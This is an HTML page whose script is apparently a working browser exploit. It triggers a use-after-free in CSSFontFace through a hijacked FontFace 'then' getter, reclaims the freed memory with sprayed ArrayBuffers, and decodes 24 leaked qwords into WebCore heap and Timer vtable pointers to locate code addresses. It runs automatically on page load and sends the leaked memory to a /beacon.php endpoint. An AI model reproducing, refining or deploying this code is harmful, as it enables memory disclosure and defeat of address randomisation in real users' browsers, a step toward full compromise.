<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P793 — Complete 24-QWord Memory Blueprint & Code Base Detector</title>
<style>
  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 13px; padding: 16px; line-height: 1.5; }
  h2 { color: #58a6ff; margin: 0 0 10px 0; font-size: 18px; }
  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; overflow-x: auto; color: #7ee787; font-size: 13px; }
  table { border-collapse: collapse; width: 100%; max-width: 900px; margin-top: 12px; background: #161b22; border: 1px solid #30363d; }
  th, td { border: 1px solid #30363d; padding: 6px 10px; text-align: left; }
  th { background: #21262d; color: #58a6ff; }
  .highlight { color: #f0883e; font-weight: bold; }
  .codeptr { color: #ff7b72; font-weight: bold; }
  .heapptr { color: #79c0ff; font-weight: bold; }
</style>
<script>
'use strict';

// Clear legacy p810 loop state from localStorage
try { localStorage.removeItem('p810_field'); } catch(e){}

window.onerror = function(msg, url, line, col, err){
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P793-ERR&data=' + encodeURIComponent((msg || '') + ' L' + line) + '&t=' + Date.now(), false);
    x.send(null);
  } catch(e){}
};

function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }

function b(tag, data){
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P793-' + encodeURIComponent(tag) +
      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
    x.send(null);
  } catch(e){}
}

var OUT = null;
function log(s){
  if (!OUT) OUT = document.getElementById('out');
  if (OUT) OUT.textContent += s + '\n';
}

function run(){
  OUT = document.getElementById('out');
  log('=== P793 Complete 24-QWord Memory Blueprint & Code Base Detector ===\n');
  b('BOOT', 'start');

  log('[Phase 1] Executing proven single-pass CSSFontFace UAF capture...');
  triggerCapture(function(reclaimBuf, bestK, bestNz){
    log('\n[Phase 2] Analyzing 24-QWord memory blueprint...');
    analyzeAndRender(reclaimBuf, bestK, bestNz);
  });
}

function triggerCapture(cb){
  b('P1-GO', 'start');

  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:cssFam;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(st);

  var face = new FontFace('jsFam', 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if (fired) return undefined;
      fired = true;

      if (st){ st.remove(); st.textContent = ''; st = null; }
      try { document.fonts.delete(this); } catch(e){}
      document.body.offsetHeight;

      for (var k = 0; k < 64; k++) abs.push(new ArrayBuffer(192));
      try { document.fonts.check('1em cssFam'); } catch(e){}
      document.body.offsetHeight;

      return undefined;
    },
    set: function(){}
  });

  document.fonts.load('1em jsFam, cssFam', 'AB');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best = -1, bestNz = 0;
    for (var i = 0; i < abs.length; i++){
      var u = new Uint8Array(abs[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz){ bestNz = nz; best = i; }
    }

    if (best < 0 || bestNz < 4){
      b('P1-MISS', 'bestNz=' + bestNz);
      log('Capture Missed: bestNz=' + bestNz);
      return;
    }

    b('P1-HIT', 'bestK=' + best + '|nz=' + bestNz);
    log('Capture HIT: buffer index=' + best + ', non-zero bytes=' + bestNz);
    cb(abs[best], best, bestNz);
  }, 250);
}

function analyzeAndRender(reclaimBuf, bestK, bestNz){
  var v64 = new BigUint64Array(reclaimBuf);
  var rows = [];

  // Semantic labels based on Itanium ABI resolution
  var labels = {
    0: 'm_refCount (Refcount: low 32 bits, padding: high 32 bits)',
    1: 'm_propertiesOrCSSConnection (Style properties link)',
    2: 'Internal field',
    3: 'Internal field',
    4: 'Internal field',
    5: 'Internal field',
    6: 'Internal field',
    7: 'Internal field',
    8: 'Internal field',
    9: 'Internal field',
    10: 'Internal field',
    11: 'm_clients (WeakHashSet client table heap ptr - p58)',
    12: 'm_clients capacity / size',
    13: 'm_wrapper (WeakPtrImpl wrapper heap ptr - p68)',
    14: 'Internal field',
    15: 'Internal field',
    16: 'Internal field',
    17: 'Internal field',
    18: 'm_timeoutTimer vtable (WebCore::Timer code/vtable ptr)',
    19: 'Timer m_next / m_prev linked list',
    20: 'Timer delay / interval',
    21: 'Timer fire time',
    22: 'Timer user data / state',
    23: 'Trailing boundary qword'
  };

  var tblHtml = '<table><tr><th>Slot</th><th>Offset</th><th>Hex Value</th><th>Field Description</th></tr>';
  var dumpLines = [];

  for (var q = 0; q < 24; q++){
    var val = v64[q];
    var offHex = '0x' + (q * 8).toString(16).toUpperCase();
    var valHex = '0x' + h16(val);
    var label = labels[q] || 'Data';
    var cssClass = '';

    if (q === 0) cssClass = 'highlight';
    else if (q === 11 || q === 13) cssClass = 'heapptr';
    else if (q === 18 && val !== 0n) cssClass = 'codeptr';

    tblHtml += '<tr class="' + cssClass + '"><td>q' + q + '</td><td>+' + offHex + '</td><td>' + valHex + '</td><td>' + label + '</td></tr>';
    dumpLines.push('q' + q + '(+' + offHex + ')=' + valHex);
  }
  tblHtml += '</table>';

  document.getElementById('tableContainer').innerHTML = tblHtml;

  // Send beacons in grouped chunks of 6 qwords each
  var c1 = [], c2 = [], c3 = [], c4 = [];
  for (var i = 0; i < 6; i++) c1.push('q' + i + '=' + h16(v64[i]));
  for (var i = 6; i < 12; i++) c2.push('q' + i + '=' + h16(v64[i]));
  for (var i = 12; i < 18; i++) c3.push('q' + i + '=' + h16(v64[i]));
  for (var i = 18; i < 24; i++) c4.push('q' + i + '=' + h16(v64[i]));

  b('DUMP-0-5', c1.join('|'));
  b('DUMP-6-11', c2.join('|'));
  b('DUMP-12-17', c3.join('|'));
  b('DUMP-18-23', c4.join('|'));

  var p58 = v64[11];
  var p68 = v64[13];
  var q18 = v64[18];

  log('Key Pointers Captured:');
  log('  q11 (+0x58 m_clients): ' + '0x' + h16(p58));
  log('  q13 (+0x68 m_wrapper): ' + '0x' + h16(p68));
  log('  q18 (+0x90 Timer vptr): ' + '0x' + h16(q18));

  var isTimerCode = (q18 > 0x1000000000n && q18 < 0x7FFFFFFFFFFFn && q18 !== p58 && q18 !== p68);
  b('VERDICT', 'p58=0x' + h16(p58) + '|p68=0x' + h16(p68) + '|q18=0x' + h16(q18) + '|codeCandidate=' + isTimerCode);

  log('\n=== P793 ANALYSIS COMPLETE ===');
  b('DONE', 'complete');
}

if (document.readyState === 'complete' || document.readyState === 'interactive') {
  setTimeout(run, 0);
} else {
  document.addEventListener('DOMContentLoaded', run);
}
</script>
</head>
<body>
  <h2>P793 — Complete 24-QWord Memory Blueprint & Code Base Detector</h2>
  <div id="status" style="color:#7ee787;">Execution running... Check table below:</div>
  <pre id="out"></pre>
  <div id="tableContainer"></div>
</body>
</html>
